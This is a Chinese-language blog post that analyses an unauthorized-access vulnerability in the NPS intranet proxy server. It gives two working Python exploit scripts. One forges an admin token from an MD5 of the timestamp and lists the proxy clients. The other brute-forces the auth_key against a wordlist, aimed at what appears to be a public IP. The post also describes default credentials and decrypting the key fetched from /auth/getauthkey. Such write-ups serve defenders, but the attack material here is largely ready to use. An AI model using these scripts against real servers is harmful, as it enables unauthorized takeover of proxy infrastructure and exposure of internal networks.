---
title: NPS未授权访问漏洞详解
published: 2023-09-05 10:05
category: 内网
draft: false
tags: [NPS, 未授权访问, 漏洞分析]
---

# NPS未授权访问漏洞详解

## 0x01简介

NPS是一款轻量级、高性能、功能强大的内网渗透代理服务器，具有强大的Web管理终端。在红蓝队攻防战经常被用来进行内网穿透，流量代理。相比较frp、sockets等代理工具来说NPS有web界面可以更方便的对代理进行管理，深受网络安全人员的喜爱。

在2022年8月份左右，NPS爆出了当用户使用默认配置，未配置auth_key参数时攻击者可以利用时间戳直接伪造管理员token的漏洞。但这个漏洞修复还有些需要注意的地方，请往下看。

## 0x02复现

### 1.搭建NPS服务器

在/etc/nps/nps.conf的配置文件使用默认配置文件。注意这里auth_key被注释，auth_crypt_key为默认值。

![](/images/posts/nps-unauthorized-access/1.png)

### 2.访问网站

这里还有个漏洞要注意，nps的默认账号为admin密码为123。所以请不要忘记更改密码。

![](/images/posts/nps-unauthorized-access/2.png)

### 3.运行

以下脚本就可以获得NPS里的代理信息，其中打印出来的链接可以直接粘贴到nps的url后面进入后台。

```python
import time
import requests
import hashlib

now = time.time()
m = hashlib.md5()
m.update(str(int(now)).encode("utf8"))
auth_key = m.hexdigest()
datas = {'search': "", "order": "asc", "offset": 0, "limit": 10, 'auth_key': auth_key, 'timestamp': int(now)}
print("/index/index?auth_key={0}&timestamp={1}".format(auth_key, int(now)))
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
}
response = requests.post("http://192.168.221.130:8080/client/list", data=datas, headers=headers, allow_redirects=False)
print(response.status_code)
print(response.text)
```

![](/images/posts/nps-unauthorized-access/3.png)

![](/images/posts/nps-unauthorized-access/4.png)

## 0x03进阶

该漏洞修复方式是注释掉auth_crypt_key，并修改auth_key的值为随机值，但很多开发者并不会给auth_key设置为随机值，导致攻击者可以爆破该值拼接到时间戳上md5来触发此漏洞。

### 1.auth_key

这里我将auth_crypt_key注释掉，修改auth_key的值为test，因为官方默认auth_key的值就是test，如果开发者只是删除了前方的注释，则值为test。

![](/images/posts/nps-unauthorized-access/5.png)

### 2.爆破

但还有很多情况下开发者自己配置了auth_key所以我们修改脚本对auth_key的值进行爆破。如果秘钥正确，也可以利用该漏洞。

```python
import time
import requests
import hashlib

with open(r"E:\tools\password\100.txt", encoding="utf8") as f:
    for cs in f.readlines():
        now = time.time()
        m = hashlib.md5()
        cs = cs.replace("\n", "").strip()
        m.update(cs.encode() + str(int(now)).encode("utf8"))
        auth_key = m.hexdigest()
        datas = {'search': "", "order": "asc", "offset": 0, "limit": 10, 'auth_key': auth_key, 'timestamp': int(now)}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
        }
        response = requests.post("http://192.3.235.87:8080/client/list", data=datas, headers=headers,
                                 allow_redirects=False)
        print(cs)
        print(response.status_code)
        if response.status_code == 200:
            print("/index/index?auth_key={0}&timestamp={1}".format(auth_key, int(now)))
            print(response.text)
            break
```

![](/images/posts/nps-unauthorized-access/6.png)

还有种情况就是开发者同时设置了auth_crypt_key和auth_key，此时可以通过访问/auth/getauthkey接口获取到加密的auth_key但是需要猜到auth_crypt_key的值才能解出正确的auth_key。

所以同样的，这种情况下可以对auth_crypt_key的值进行爆破，但需要注意一般auth_crypt_key的值都是16位数，默认是1234567812345678。有正确的auth_crypt_key后就可以对访问/auth/getauthkey的接口获得的秘钥进行AES CBC PK7解密，之后的利用过程就和上面一样。

### 3.NPS如下配置。

![](/images/posts/nps-unauthorized-access/7.png)

### 4.访问接口

访问/auth/getauthkey接口获取加密的后的auth_key。

![](/images/posts/nps-unauthorized-access/8.png)

### 5.解密

对7831xxxx进行解密，秘钥和IV为你猜测的auth_crypt_key，AES解密，可以看到顺利解出了auth_key。如果你没解出来，大概率是你猜测的秘钥不对。

![](/images/posts/nps-unauthorized-access/9.png)

### 6.拼接

和之前一样，将auth_key和时间戳拼接md5后既可利用该漏洞。

![](/images/posts/nps-unauthorized-access/10.png)

![](/images/posts/nps-unauthorized-access/11.jpg)

